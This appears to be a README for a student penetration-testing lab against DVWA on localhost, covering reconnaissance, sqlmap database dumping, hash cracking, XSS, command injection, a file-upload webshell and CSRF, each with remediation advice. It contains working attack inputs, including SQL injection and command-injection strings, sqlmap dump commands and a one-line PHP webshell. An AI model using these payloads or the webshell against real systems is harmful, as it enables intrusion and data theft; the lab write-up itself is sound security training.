<div align="center">

# 🌐 Sub-Project 1 — Web Application VAPT Lab

<img src="https://capsule-render.vercel.app/api?type=venom&color=0:0d1117,50:112240,100:233554&height=220&section=header&text=Web%20Application%20VAPT%20Lab&fontSize=38&fontColor=64ffda&animation=fadeIn&fontAlignY=38&desc=DVWA%20%7C%20Recon%20%7C%20Burp%20Suite%20%7C%20SQLMap%20%7C%20XSS%20%7C%20Command%20Injection%20%7C%20CSRF&descAlignY=60&descSize=14&descColor=ccd6f6" width="100%"/>

[![Typing SVG](https://readme-typing-svg.demolab.com?font=JetBrains+Mono\&size=15\&duration=3000\&pause=900\&color=64FFDA\&center=true\&vCenter=true\&multiline=true\&repeat=true\&width=900\&height=70\&lines=Web+Application+VAPT+Lab;Reconnaissance+%7C+Enumeration+%7C+Manual+Validation+%7C+Exploitation;Evidence-based+testing+%7C+Screenshots+included+%7C+Sensitive+data+redacted)](https://git.io/typing-svg)

<br/>

[![OWASP](https://img.shields.io/badge/OWASP_Top_10-2021-3E4D6C?style=for-the-badge\&logo=owasp\&logoColor=white)](https://owasp.org/Top10/)
[![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=for-the-badge\&logo=portswigger\&logoColor=white)](https://portswigger.net/)
[![DVWA](https://img.shields.io/badge/DVWA-Vulnerable%20Web%20Lab-233554?style=for-the-badge)](https://github.com/digininja/DVWA)
[![Status](https://img.shields.io/badge/Status-Completed-00d4aa?style=for-the-badge)](.)

<br/>

![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square\&logo=kalilinux\&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-Lab%20Deployment-2496ED?style=flat-square\&logo=docker\&logoColor=white)
![Nmap](https://img.shields.io/badge/Nmap-Port%20Scanning-0E83CD?style=flat-square)
![Gobuster](https://img.shields.io/badge/Gobuster-Directory%20Enumeration-3DDC84?style=flat-square)
![Nikto](https://img.shields.io/badge/Nikto-Web%20Scanning-5C4033?style=flat-square)
![WhatWeb](https://img.shields.io/badge/WhatWeb-Tech%20Fingerprinting-8A2BE2?style=flat-square)
![SQLMap](https://img.shields.io/badge/SQLMap-SQLi%20Validation-C23B22?style=flat-square)
![John](https://img.shields.io/badge/John_the_Ripper-Hash%20Cracking-111111?style=flat-square)

<br/>

*Controlled Web Application Vulnerability Assessment and Penetration Testing lab using DVWA and local vulnerable targets. The assessment demonstrates reconnaissance, enumeration, manual validation, exploitation evidence, and secure reporting practice.*

[← Back to Main Project](../README.md)

</div>

---

## 📚 Table of Contents

* [📋 Engagement Summary](#-engagement-summary)
* [🎯 Assessment Scope](#-assessment-scope)
* [🧭 OWASP Top 10 Coverage](#-owasp-top-10--coverage)
* [🧪 Evidence-Based Testing Summary](#-evidence-based-testing-summary)
* [🔍 Methodology — Phase by Phase](#-methodology--phase-by-phase)

  * [Phase 1 — Lab Setup and Tool Verification](#phase-1--lab-setup-and-tool-verification)
  * [Phase 2 — Passive and Active Reconnaissance](#phase-2--passive-and-active-reconnaissance)
  * [Phase 3 — Directory and File Enumeration](#phase-3--directory-and-file-enumeration)
  * [Phase 4 — Vulnerability Scanning and Fingerprinting](#phase-4--vulnerability-scanning-and-fingerprinting)
  * [Phase 5 — Manual Request Analysis with Burp Suite](#phase-5--manual-request-analysis-with-burp-suite)
  * [Phase 6 — SQL Injection Validation](#phase-6--sql-injection-validation)
  * [Phase 7 — SQLMap Database Enumeration](#phase-7--sqlmap-database-enumeration)
  * [Phase 8 — Hash Cracking](#phase-8--hash-cracking)
  * [Phase 9 — Cross-Site Scripting Testing](#phase-9--cross-site-scripting-testing)
  * [Phase 10 — Command Injection Testing](#phase-10--command-injection-testing)
  * [Phase 11 — File Upload / Webshell Validation](#phase-11--file-upload--webshell-validation)
  * [Phase 12 — CSRF Testing](#phase-12--csrf-testing)
* [📸 Evidence Screenshots](#-evidence-screenshots)
* [🖼️ Screenshot Gallery](#️-screenshot-gallery)
* [📊 Confirmed Lab Findings Table](#-confirmed-lab-findings-table)
* [🧠 Key Security Lessons](#-key-security-lessons)
* [🔐 Redaction and Safety Notes](#-redaction-and-safety-notes)
* [📂 Files in This Folder](#-files-in-this-folder)
* [✅ Completion Status](#-completion-status)

---

## 📄 Web VAPT Document
[Web VAPT Report](./reports/Web-VAPT-Report-Enterprise-Security-Assessment-Lab.pdf)

---

## 📋 Engagement Summary

| Field                       | Details                                                                                            |
| --------------------------- | -------------------------------------------------------------------------------------------------- |
| **Project Area**            | Web Application Vulnerability Assessment and Penetration Testing                                   |
| **Primary Target**          | DVWA running in local lab environment                                                              |
| **Testing Environment**     | Kali Linux attack machine with Docker-based vulnerable target                                      |
| **Testing Type**            | Controlled lab assessment                                                                          |
| **Testing Style**           | Reconnaissance → Enumeration → Manual validation → Exploitation proof → Evidence capture           |
| **Methodology Reference**   | OWASP Web Security Testing methodology, OWASP Top 10, PTES-style workflow                          |
| **Main Tools**              | Nmap, Gobuster, Nikto, WhatWeb, Burp Suite, SQLMap, John the Ripper                                |
| **Assessment Status**       | Completed Practical Assessment                                                                     |
| **Evidence Style**          | Screenshot-based GitHub portfolio documentation                                                    |
| **Sensitive Data Handling** | Cookies, hashes, credentials, session IDs, and shell details must be redacted before public upload |

> This Web VAPT assessment was performed only inside an authorized local lab environment. The purpose is to demonstrate practical methodology, validation, evidence capture, and professional documentation — not unauthorized testing.

---

## 🎯 Assessment Scope

The Web VAPT lab focused on the following areas:

```text
Kali Linux Lab Setup
→ Docker Target Deployment
→ Passive Reconnaissance
→ Nmap Port and Service Discovery
→ Directory and File Enumeration
→ Technology Fingerprinting
→ Vulnerability Scanning
→ Burp Suite Request Interception
→ SQL Injection Validation
→ SQLMap Database Enumeration
→ Hash Cracking
→ Reflected and Stored XSS Testing
→ Command Injection Testing
→ File Upload / Webshell Validation
→ CSRF Testing
→ Evidence Capture and Redaction
```

### In Scope

| Area                                         |      Status |
| -------------------------------------------- | ----------: |
| Kali Linux lab environment                   | ✅ Completed |
| Docker vulnerable target deployment          | ✅ Completed |
| DVWA browser access                          | ✅ Completed |
| Tool installation/version verification       | ✅ Completed |
| Passive reconnaissance                       | ✅ Completed |
| Nmap port/service scan                       | ✅ Completed |
| Gobuster directory enumeration               | ✅ Completed |
| Nikto vulnerability scan                     | ✅ Completed |
| WhatWeb technology fingerprinting            | ✅ Completed |
| Burp Suite interception and Repeater testing | ✅ Completed |
| SQL Injection manual validation              | ✅ Completed |
| SQLMap database enumeration                  | ✅ Completed |
| SQLMap users table dump                      | ✅ Completed |
| John MD5 hash cracking                       | ✅ Completed |
| Reflected XSS validation                     | ✅ Completed |
| Stored XSS validation                        | ✅ Completed |
| Command Injection validation                 | ✅ Completed |
| File Upload / Webshell validation            | ✅ Completed |
| CSRF forged request proof                    | ✅ Completed |
| Recon report file generation                 | ✅ Completed |

### Out of Scope

| Area                            | Reason                       |
| ------------------------------- | ---------------------------- |
| Real websites                   | Not authorized               |
| Production applications         | Not part of lab              |
| Public internet exploitation    | Not required and not ethical |
| Destructive actions outside lab | Strictly excluded            |
| Unredacted credentials/hashes   | Must not be published        |

---

## 🧭 OWASP Top 10 — Coverage

This table reflects the categories tested and evidenced in this lab. It does not claim unverified production impact.

| OWASP Category                                   | Tested | Evidence / Result                                  | Outcome                                      |
| ------------------------------------------------ | :----: | -------------------------------------------------- | -------------------------------------------- |
| A01 — Broken Access Control                      |    ✅   | CSRF and request manipulation testing              | Lab behaviour tested                         |
| A02 — Cryptographic Failures                     |    ✅   | SQLMap users dump + hash cracking workflow         | Credential/hash handling demonstrated in lab |
| A03 — Injection                                  |    ✅   | SQLi, SQLMap, Command Injection                    | Vulnerable behaviour observed                |
| A04 — Insecure Design                            |    ✅   | Multiple intentionally vulnerable DVWA flows       | Lab design weakness reviewed                 |
| A05 — Security Misconfiguration                  |    ✅   | Nikto, WhatWeb, headers/fingerprint review         | Misconfiguration-style evidence collected    |
| A06 — Vulnerable and Outdated Components         |    ✅   | Technology and service fingerprinting              | Versions/fingerprints reviewed               |
| A07 — Identification and Authentication Failures |    ✅   | Weak/default credential and hash cracking workflow | Lab authentication weakness demonstrated     |
| A08 — Software and Data Integrity Failures       |    ✅   | File upload/webshell testing                       | Upload handling weakness demonstrated        |
| A09 — Security Logging and Monitoring Failures   |    ⚪   | Not deeply tested in current evidence              | Not claimed                                  |
| A10 — Server-Side Request Forgery                |    ⚪   | Not a primary tested finding in current evidence   | Not claimed                                  |

---

## 🧪 Evidence-Based Testing Summary

| Test Area                     | Evidence File                                    | Result Type                                                                  |
| ----------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------- |
| Kali environment              | [Kali](./reports/evidence/01-kali-linux-desktop-full-screen-evidence-documentation.pdf)          | Lab setup proof              |
| Docker target deployment      | [Docker](./reports/evidence/02-docker-containers-running-evidence-documentation.pdf)               | Target running proof       |
| DVWA browser access           | `03-dvwa-login-page-browser.png`                 | Application availability proof |
| Tool readiness                | `04-tools-installed-version-check.png`           | Tools installed                |
| Nmap scanning                 | `05-nmap-full-port-scan-output.png`              | Service discovery              |
| Gobuster enumeration          | `06-gobuster-directory-results.png`              | Directory discovery            |
| Gobuster additional output    | `06-gobuster-directory-results(M).png`           | Enumeration evidence           |
| Nikto scanning                | `07-nikto-scan-findings.png`                     | Vulnerability scan output      |
| John cracking                 | `07-john-md5-hashes-cracked.png`                 | Hash cracking evidence         |
| WhatWeb fingerprinting        | `08-whatweb-tech-fingerprint-p1.png`             | Technology fingerprinting      |
| WhatWeb fingerprinting        | `08-whatweb-tech-fingerprint-p2.png`             | Technology fingerprinting      |
| WhatWeb fingerprinting        | `08-whatweb-tech-fingerprint-p3.png`             | Technology fingerprinting      |
| WhatWeb fingerprinting        | `08-whatweb-tech-fingerprint-p4.png`             | Technology fingerprinting      |
| SQL Injection                 | `09-dvwa-sqli-vulnerable-input-response.png`     | Manual SQLi validation         |
| Recon reports                 | `09-recon-report-files-generated.png`            | Report/output generation       |
| SQLMap enumeration            | `10-sqlmap-database-enumeration.png`             | Database enumeration           |
| SQLMap dump                   | `11-sqlmap-users-table-dump.png`                 | Users table dump               |
| Burp interception             | `13-burp-intercepted-request.png`                | Request capture                |
| Burp Repeater                 | `14-burp-repeater-modified-request-response.png` | Manual request modification    |
| Reflected XSS                 | `15-reflected-xss-alert-popup.png`               | XSS validation                 |
| Reflected XSS additional      | `15-reflected-xss-alert-popup-p2.png`            | XSS validation                 |
| Stored XSS                    | `16-stored-xss-payload-source.png`               | Stored payload evidence        |
| Command Injection             | `17-command-injection-id-whoami-output.png`      | OS command execution proof     |
| File Upload                   | `18-file-upload-webshell-confirmed-p1.png`       | Webshell/upload validation     |
| File Upload additional        | `18-file-upload-webshell-confirmed-p2.png`       | Webshell/upload validation     |
| CSRF                          | `19-csrf-forged-request-proof.png`               | Forged request proof           |
| Passive Recon                 | `Passive-Recon-p1.png`                           | Recon evidence                 |
| Passive Recon                 | `Passive-Recon-p2.png`                           | Recon evidence                 |
| Passive Recon                 | `Passive-Recon-p3.png`                           | Recon evidence                 |
| Directory Enumeration Summary | `Directory-&-File-Enumeration-with-Gobuster.png` | Enumeration summary            |
| Tools / Install               | `installed.png`                                  | Setup evidence                 |

---

## 🔍 Methodology — Phase by Phase

---

### Phase 1 — Lab Setup and Tool Verification

**Objective:** Confirm the attack machine, vulnerable target, and required tools were ready before testing.

```bash
# Confirm Kali environment
uname -a
whoami

# Confirm Docker containers
docker ps

# Confirm tool versions
nmap --version
gobuster version
nikto -Version
whatweb --version
sqlmap --version
john --version
```

**Evidence captured:**

```text
01-kali-linux-desktop-full-screen.png
02-docker-containers-running.png
03-dvwa-login-page-browser.png
04-tools-installed-version-check.png
installed.png
```

**Result:**

```text
Kali Linux environment, Docker lab target, DVWA browser access, and tool readiness were confirmed.
```


 📄 **Lab Setup and Tool Verification Document**

[📄 Lab Setup and Tool Verification](./reports/01-web-vapt-lab-setup-and-tool-verification.pdf)

---

### Phase 2 — Passive and Active Reconnaissance

**Objective:** Understand the target surface before exploitation.

Passive and active reconnaissance helped identify reachable services, technologies, and exposed application behaviour.

```bash
# Passive / basic HTTP checks
curl -I http://127.0.0.1:8081

# Technology fingerprinting
whatweb http://127.0.0.1:8081

# Nmap scan
nmap -sV -sC -A -p- 127.0.0.1 -oN tool-outputs/nmap-full-port-scan-output.txt
```

**Evidence captured:**

```text
Passive-Recon-p1.png
Passive-Recon-p2.png
Passive-Recon-p3.png
05-nmap-full-port-scan-output.png
08-whatweb-tech-fingerprint-p1.png
08-whatweb-tech-fingerprint-p2.png
08-whatweb-tech-fingerprint-p3.png
08-whatweb-tech-fingerprint-p4.png
```

**Result:**

```text
Reconnaissance identified exposed web services and application technology details for further testing.
```


 📄 **Passive and Active Reconnaissance Document**

[📄 Passive and Active Reconnaissance](./reports/02-web-vapt-passive-active-reconnaissance.pdf)

---

### Phase 3 — Directory and File Enumeration

**Objective:** Discover hidden files, directories, and application paths.

```bash
gobuster dir \
  -u http://127.0.0.1:8081 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak \
  -o tool-outputs/gobuster-directory-results.txt
```

**Evidence captured:**

```text
06-gobuster-directory-results.png
06-gobuster-directory-results(M).png
Directory-&-File-Enumeration-with-Gobuster.png
```

**Result:**

```text
Directory and file enumeration identified accessible application paths for manual validation.
```

 📄 **Directory and File Enumeration Document**
[📄 Directory and File Enumeration](./reports/03-web-vapt-directory-file-enumeration.pdf)

---

### Phase 4 — Vulnerability Scanning and Fingerprinting

**Objective:** Use automated tools to identify low-hanging misconfigurations and web server issues.

```bash
nikto -h http://127.0.0.1:8081 -o tool-outputs/nikto-scan-findings.txt
whatweb http://127.0.0.1:8081
```

**Evidence captured:**

```text
07-nikto-scan-findings.png
08-whatweb-tech-fingerprint-p1.png
08-whatweb-tech-fingerprint-p2.png
08-whatweb-tech-fingerprint-p3.png
08-whatweb-tech-fingerprint-p4.png
```

**Result:**

```text
Nikto and WhatWeb provided scan findings and technology fingerprinting evidence.
```


📄 **Vulnerability Scanning and Fingerprinting Document**

[📄Vulnerability Scanning and Fingerprinting](./reports/04-web-vapt-vulnerability-scanning-fingerprinting.pdf)

---

### Phase 5 — Manual Request Analysis with Burp Suite

**Objective:** Intercept and modify HTTP requests manually to understand application behaviour.

```text
Browser proxy → 127.0.0.1:8080
Burp Suite → Proxy → HTTP history / Repeater
```

**Evidence captured:**

```text
13-burp-intercepted-request.png
14-burp-repeater-modified-request-response.png
```

**Result:**

```text
Burp Suite was used to capture and modify requests for manual validation.
```

**Security note:**

```text
Session cookies and PHPSESSID values should be redacted before public release.
```

📄 **Burp Suite Manual Request Analysis Document**
[📄 Burp Suite Manual Request Analysis](./reports/05-web-vapt-burp-suite-manual-request-analysis.pdf)

---

### Phase 6 — SQL Injection Validation

#### Finding 1 — SQL Injection

**Objective:** Validate whether user-controlled input was unsafely used in SQL queries.

Example lab payload:

```text
1' OR '1'='1
```

**Evidence captured:**

```text
09-dvwa-sqli-vulnerable-input-response.png
```

**Observed behaviour:**

```text
Manual SQL injection validation returned unintended database-backed output in the DVWA lab.
```

**Risk:**

```text
In a real application, SQL injection could allow authentication bypass, data extraction, modification, or full database compromise.
```

**Recommended remediation:**

```text
Use parameterized queries / prepared statements.
Avoid concatenating user-controlled input into SQL queries.
Validate input server-side.
Use least-privileged database accounts.
```

📄 **SQL Injection Manual Validation Document**

[📄 SQL Injection Manual Validation](./reports/06-web-vapt-sql-injection-manual-validation.pdf)

---

### Phase 7 — SQLMap Database Enumeration

**Objective:** Validate SQL injection impact using SQLMap in the controlled DVWA lab.

```bash
# Example workflow
sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<REDACTED>; security=low" \
  --dbs --batch
```

```bash
# Database/table enumeration
sqlmap -u "<TARGET_URL>" --cookie="<REDACTED_COOKIE>" -D dvwa --tables --batch

# Users table dump in lab
sqlmap -u "<TARGET_URL>" --cookie="<REDACTED_COOKIE>" -D dvwa -T users --dump --batch
```

**Evidence captured:**

```text
10-sqlmap-database-enumeration.png
11-sqlmap-users-table-dump.png
```

**Result:**

```text
SQLMap was used to enumerate database information in the authorized DVWA lab.
```

**Redaction note:**

```text
Database dumps, usernames, password hashes, and cracked passwords must be redacted before public release.
```

📄 **SQLMap Database Enumeration Document**

[📄 SQLMap Database Enumeration](./reports/07-web-vapt-sqlmap-database-enumeration.pdf)

---

### Phase 8 — Hash Cracking

**Objective:** Demonstrate the risk of weak password hashes obtained from a vulnerable lab target.

```bash
# Example lab hash workflow
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt
```

**Evidence captured:**

```text
07-john-md5-hashes-cracked.png
```

**Observed behaviour:**

```text
Weak MD5-style hash cracking was demonstrated in the lab.
```

**Risk:**

```text
If password hashes are exposed and weakly hashed, attackers can recover plaintext passwords and reuse credentials.
```

**Recommended remediation:**

```text
Use strong password hashing algorithms such as bcrypt, Argon2, or PBKDF2.
Use salts.
Enforce strong password policy.
Protect databases from injection and unauthorized access.
```

📄 **SQLMap Database Enumeration Document**

[📄 Hash Cracking with John the Ripper](./reports/08-web-vapt-hash-cracking-john.pdf)

---

### Phase 9 — Cross-Site Scripting Testing

#### Finding 2 — Reflected XSS

**Objective:** Check whether user input is reflected into the page without proper encoding.

```html
<script>alert('lab')</script>
```

**Evidence captured:**

```text
15-reflected-xss-alert-popup.png
15-reflected-xss-alert-popup-p2.png
```

**Observed behaviour:**

```text
Reflected XSS was validated in the DVWA lab.
```

---

#### Finding 3 — Stored XSS

**Objective:** Check whether malicious input is stored and later rendered to users.

```html
<script>alert('stored-lab')</script>
```

**Evidence captured:**

```text
16-stored-xss-payload-source.png
```

**Observed behaviour:**

```text
Stored XSS payload/source evidence was captured in the lab.
```

**Recommended remediation for XSS:**

```text
Encode output based on context.
Sanitize user input.
Use Content Security Policy.
Avoid rendering raw user-controlled input.
Validate and encode input server-side and client-side.
```

📄 **Cross-Site Scripting: Reflected and Stored Document**

[📄 Cross-Site Scripting: Reflected and Stored](./reports/09-web-vapt-cross-site-scripting-reflected-stored.pdf)

---

### Phase 10 — Command Injection Testing

#### Finding 4 — OS Command Injection

**Objective:** Test whether user input is passed unsafely into OS-level commands.

Example lab payload:

```bash
127.0.0.1; id
127.0.0.1; whoami
```

**Evidence captured:**

```text
17-command-injection-id-whoami-output.png
```

**Observed behaviour:**

```text
Command injection was validated in the DVWA lab by executing OS identity commands.
```

**Risk:**

```text
In a real application, command injection could allow attackers to execute arbitrary operating system commands.
```

**Recommended remediation:**

```text
Avoid passing user input to shell commands.
Use safe APIs instead of shell execution.
Apply strict allowlists.
Escape arguments safely where command execution is unavoidable.
Run services with least privilege.
```

📄 **Command Injection Document**

[📄 Command Injection](./reports/10-web-vapt-command-injection.pdf)

---

### Phase 11 — File Upload / Webshell Validation

#### Finding 5 — Unrestricted File Upload / Webshell

**Objective:** Test whether the application allows upload and execution of dangerous file types.

Example lab webshell concept:

```php
<?php system($_GET["cmd"]); ?>
```

**Evidence captured:**

```text
18-file-upload-webshell-confirmed-p1.png
18-file-upload-webshell-confirmed-p2.png
```

**Observed behaviour:**

```text
File upload and webshell-style command execution were validated in the controlled DVWA lab.
```

**Risk:**

```text
If present in production, unrestricted file upload can lead to remote code execution, data theft, or full server compromise.
```

**Recommended remediation:**

```text
Restrict allowed file types.
Validate MIME type and file extension server-side.
Rename uploaded files.
Store uploads outside the web root.
Disable script execution in upload directories.
Scan uploaded files.
```

📄 **File Upload and Webshell Validation Document**

[📄 File Upload and Webshell Validation](./reports/11-web-vapt-file-upload-webshell-validation.pdf)

---

### Phase 12 — CSRF Testing

#### Finding 6 — Cross-Site Request Forgery

**Objective:** Validate whether a sensitive action can be triggered through a forged request.

**Evidence captured:**

```text
19-csrf-forged-request-proof.png
```

**Observed behaviour:**

```text
A forged request proof was captured in the DVWA lab.
```

**Risk:**

```text
CSRF can allow attackers to force authenticated users to perform unwanted actions.
```

**Recommended remediation:**

```text
Use anti-CSRF tokens.
Set SameSite cookie attributes.
Require re-authentication for sensitive actions.
Validate Origin and Referer headers where appropriate.
```

📄 **File Upload and Webshell Validation Document**

[📄 CSRF Forged Request Testing](./reports/12-web-vapt-csrf-forged-request-testing.pdf)

---

## 📸 Evidence Screenshots

| #  | Screenshot Name                                  | Description                          |
| -- | ------------------------------------------------ | ------------------------------------ |
| 01 | `01-kali-linux-desktop-full-screen.png`          | Kali Linux lab environment           |
| 02 | `02-docker-containers-running.png`               | Docker vulnerable containers running |
| 03 | `03-dvwa-login-page-browser.png`                 | DVWA accessible in browser           |
| 04 | `04-tools-installed-version-check.png`           | Tools installed and verified         |
| 05 | `05-nmap-full-port-scan-output.png`              | Nmap full port/service scan          |
| 06 | `06-gobuster-directory-results.png`              | Gobuster directory enumeration       |
| 07 | `06-gobuster-directory-results(M).png`           | Additional Gobuster output           |
| 08 | `07-nikto-scan-findings.png`                     | Nikto scan findings                  |
| 09 | `07-john-md5-hashes-cracked.png`                 | John MD5 hash cracking               |
| 10 | `08-whatweb-tech-fingerprint-p1.png`             | WhatWeb technology fingerprinting    |
| 11 | `08-whatweb-tech-fingerprint-p2.png`             | WhatWeb technology fingerprinting    |
| 12 | `08-whatweb-tech-fingerprint-p3.png`             | WhatWeb technology fingerprinting    |
| 13 | `08-whatweb-tech-fingerprint-p4.png`             | WhatWeb technology fingerprinting    |
| 14 | `09-dvwa-sqli-vulnerable-input-response.png`     | Manual SQL injection validation      |
| 15 | `09-recon-report-files-generated.png`            | Recon report files generated         |
| 16 | `10-sqlmap-database-enumeration.png`             | SQLMap database enumeration          |
| 17 | `11-sqlmap-users-table-dump.png`                 | SQLMap users table dump              |
| 18 | `13-burp-intercepted-request.png`                | Burp request interception            |
| 19 | `14-burp-repeater-modified-request-response.png` | Burp Repeater request modification   |
| 20 | `15-reflected-xss-alert-popup.png`               | Reflected XSS validation             |
| 21 | `15-reflected-xss-alert-popup-p2.png`            | Additional reflected XSS proof       |
| 22 | `16-stored-xss-payload-source.png`               | Stored XSS payload/source            |
| 23 | `17-command-injection-id-whoami-output.png`      | Command injection validation         |
| 24 | `18-file-upload-webshell-confirmed-p1.png`       | File upload webshell confirmation    |
| 25 | `18-file-upload-webshell-confirmed-p2.png`       | Additional webshell confirmation     |
| 26 | `19-csrf-forged-request-proof.png`               | CSRF forged request proof            |
| 27 | `Passive-Recon-p1.png`                           | Passive recon evidence               |
| 28 | `Passive-Recon-p2.png`                           | Passive recon evidence               |
| 29 | `Passive-Recon-p3.png`                           | Passive recon evidence               |
| 30 | `Directory-&-File-Enumeration-with-Gobuster.png` | Directory enumeration summary        |
| 31 | `installed.png`                                  | Installation/setup evidence          |

---

## 🖼️ Screenshot Gallery

> Sensitive values should be redacted before public release. This includes cookies, session IDs, password hashes, cracked passwords, database dumps, shell paths, and webshell names.

![Kali Linux Desktop](./screenshots/01-kali-linux-desktop-full-screen.png)

![DVWA Login Page](./screenshots/03-dvwa-login-page-browser.png)

![Tools Installed Version Check](./screenshots/04-tools-installed-version-check.png)

![Nmap Full Port Scan](./screenshots/05-nmap-full-port-scan-output.png)

![Gobuster Directory Results](./screenshots/06-gobuster-directory-results.png)

![Nikto Scan Findings](./screenshots/07-nikto-scan-findings.png)

![John MD5 Hashes Cracked](./screenshots/07-john-md5-hashes-cracked.png)

![WhatWeb Technology Fingerprint](./screenshots/08-whatweb-tech-fingerprint-p1.png)

![DVWA SQL Injection Validation](./screenshots/09-dvwa-sqli-vulnerable-input-response.png)

![SQLMap Database Enumeration](./screenshots/10-sqlmap-database-enumeration.png)

![SQLMap Users Table Dump](./screenshots/11-sqlmap-users-table-dump.png)

![Burp Intercepted Request](./screenshots/13-burp-intercepted-request.png)

![Burp Repeater Modified Request Response](./screenshots/14-burp-repeater-modified-request-response.png)

![Reflected XSS Alert](./screenshots/15-reflected-xss-alert-popup.png)

![Stored XSS Payload Source](./screenshots/16-stored-xss-payload-source.png)

![Command Injection id whoami Output](./screenshots/17-command-injection-id-whoami-output.png)

![File Upload Webshell Confirmed](./screenshots/18-file-upload-webshell-confirmed-p1.png)

![CSRF Forged Request Proof](./screenshots/19-csrf-forged-request-proof.png)

---

## 📊 Confirmed Lab Findings Table

This table is based only on the evidence currently available in this folder.

| #  | Finding / Test Case                    | Severity Style                              | Evidence                                     | Status             |
| -- | -------------------------------------- | ------------------------------------------- | -------------------------------------------- | ------------------ |
| 1  | SQL Injection                          | 🔴 Critical in real-world context           | `09-dvwa-sqli-vulnerable-input-response.png` | ✅ Validated in lab |
| 2  | SQLMap Database Enumeration            | 🔴 Critical in real-world context           | `10-sqlmap-database-enumeration.png`         | ✅ Validated in lab |
| 3  | Users Table Dump / Credential Exposure | 🔴 Critical in real-world context           | `11-sqlmap-users-table-dump.png`             | ✅ Validated in lab |
| 4  | Weak Hash Cracking                     | 🟠 High in real-world context               | `07-john-md5-hashes-cracked.png`             | ✅ Validated in lab |
| 5  | Reflected XSS                          | 🟠 High in real-world context               | `15-reflected-xss-alert-popup.png`           | ✅ Validated in lab |
| 6  | Stored XSS                             | 🟠 High in real-world context               | `16-stored-xss-payload-source.png`           | ✅ Validated in lab |
| 7  | OS Command Injection                   | 🔴 Critical in real-world context           | `17-command-injection-id-whoami-output.png`  | ✅ Validated in lab |
| 8  | Unrestricted File Upload / Webshell    | 🔴 Critical in real-world context           | `18-file-upload-webshell-confirmed-p1.png`   | ✅ Validated in lab |
| 9  | CSRF Forged Request                    | 🟡 Medium in real-world context             | `19-csrf-forged-request-proof.png`           | ✅ Validated in lab |
| 10 | Directory and File Enumeration         | 🟡 Medium in real-world context             | `06-gobuster-directory-results.png`          | ✅ Completed        |
| 11 | Technology Fingerprinting              | 🟢 Informational / Recon                    | `08-whatweb-tech-fingerprint-p1.png`         | ✅ Completed        |
| 12 | Vulnerability Scan Findings            | 🟡 Medium / Informational depending finding | `07-nikto-scan-findings.png`                 | ✅ Completed        |

> Severity is expressed as “real-world context” because the target is an intentionally vulnerable local lab. Final CVSS scoring should only be added if each finding is formally scored in a separate report.

---

## 🧠 Key Security Lessons

| Area              | Lesson                                                                  |
| ----------------- | ----------------------------------------------------------------------- |
| Reconnaissance    | Good testing starts with mapping the attack surface before exploitation |
| Nmap              | Port and service discovery helps identify exposed services and versions |
| Gobuster          | Hidden directories and files can reveal sensitive application areas     |
| Nikto             | Automated scanners are useful for quick misconfiguration discovery      |
| WhatWeb           | Technology fingerprinting helps guide manual testing                    |
| Burp Suite        | Manual request interception is essential for confirming scanner results |
| SQL Injection     | Unsafe database queries can expose full database contents               |
| SQLMap            | Automated exploitation must be used only in authorized environments     |
| Hash Cracking     | Weak hashes and weak passwords create serious post-exploitation risk    |
| XSS               | Reflected and stored XSS can affect user sessions and browser trust     |
| Command Injection | Unsafely handled input can lead to OS command execution                 |
| File Upload       | Uploading executable files can lead to webshell execution               |
| CSRF              | Sensitive actions need anti-CSRF protections and proper cookie settings |
| Reporting         | Screenshots and evidence must be redacted before public GitHub upload   |

---

## 🔐 Redaction and Safety Notes

Before publishing this folder publicly, redact:

```text
PHPSESSID values
Cookies
Authorization headers
Database dumps
Usernames if private
Password hashes
Cracked passwords
Webshell filenames if sensitive
Local usernames
Full local file paths
Internal IPs if privacy is required
Any token/session value
```

Do not commit:

```text
raw database dumps
real password files
unredacted hashes
unredacted cracked passwords
webshell source files
private keys
session cookies
.env files
```

If tool output is uploaded, replace sensitive values with placeholders:

```text
<REDACTED_COOKIE>
<REDACTED_HASH>
<REDACTED_PASSWORD>
<REDACTED_PATH>
<REDACTED_SESSION>
```

---

## 📂 Files in This Folder

```text
01-web-vapt/
├── README.md
├── screenshots/
│   ├── 01-kali-linux-desktop-full-screen.png
│   ├── 02-docker-containers-running.png
│   ├── 03-dvwa-login-page-browser.png
│   ├── 04-tools-installed-version-check.png
│   ├── 05-nmap-full-port-scan-output.png
│   ├── 06-gobuster-directory-results.png
│   ├── 06-gobuster-directory-results(M).png
│   ├── 07-john-md5-hashes-cracked.png
│   ├── 07-nikto-scan-findings.png
│   ├── 08-whatweb-tech-fingerprint-p1.png
│   ├── 08-whatweb-tech-fingerprint-p2.png
│   ├── 08-whatweb-tech-fingerprint-p3.png
│   ├── 08-whatweb-tech-fingerprint-p4.png
│   ├── 09-dvwa-sqli-vulnerable-input-response.png
│   ├── 09-recon-report-files-generated.png
│   ├── 10-sqlmap-database-enumeration.png
│   ├── 11-sqlmap-users-table-dump.png
│   ├── 13-burp-intercepted-request.png
│   ├── 14-burp-repeater-modified-request-response.png
│   ├── 15-reflected-xss-alert-popup.png
│   ├── 15-reflected-xss-alert-popup-p2.png
│   ├── 16-stored-xss-payload-source.png
│   ├── 17-command-injection-id-whoami-output.png
│   ├── 18-file-upload-webshell-confirmed-p1.png
│   ├── 18-file-upload-webshell-confirmed-p2.png
│   ├── 19-csrf-forged-request-proof.png
│   ├── Directory-&-File-Enumeration-with-Gobuster.png
│   ├── Passive-Recon-p1.png
│   ├── Passive-Recon-p2.png
│   ├── Passive-Recon-p3.png
│   └── installed.png
├── tool-outputs/
└── scripts/
```

---

## ✅ Completion Status

| Section                        |      Status |
| ------------------------------ | ----------: |
| Lab environment setup          | ✅ Completed |
| Docker target deployment       | ✅ Completed |
| DVWA access validation         | ✅ Completed |
| Tool installation verification | ✅ Completed |
| Passive reconnaissance         | ✅ Completed |
| Nmap scanning                  | ✅ Completed |
| Gobuster enumeration           | ✅ Completed |
| Nikto scanning                 | ✅ Completed |
| WhatWeb fingerprinting         | ✅ Completed |
| Burp interception              | ✅ Completed |
| Burp Repeater validation       | ✅ Completed |
| SQL Injection validation       | ✅ Completed |
| SQLMap database enumeration    | ✅ Completed |
| SQLMap users table dump        | ✅ Completed |
